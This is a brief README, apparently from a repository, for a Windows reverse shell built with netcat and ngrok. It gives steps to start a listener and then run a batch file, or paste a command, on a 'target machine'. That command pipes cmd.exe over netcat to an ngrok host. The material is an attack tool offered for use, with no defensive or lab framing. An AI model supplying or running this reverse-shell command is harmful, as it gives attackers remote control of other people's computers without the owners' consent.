# Simple-Reverse-Shell-Windows
Simple reverse shell Windows CMD with Netcat and Ngrok

# How To Use
  For example:
  
        On Remote Machine:
  1. run "ngrok tcp 6969"
  2. run netcat "nc -lvnp 6969"
  
        On target machine Windows:
  1. edit RShell.bat and put your ngrok ip and port, should be like this "....\\nc.exe -e cmd.exe 0.tcp.ngrok.io 27384"
  2. Then run RShell.bat on your target machine. 


     OR YOU CAN JUST COPY THE COMMAND AND PASTE ON CMD/POWERSHELL :)
     
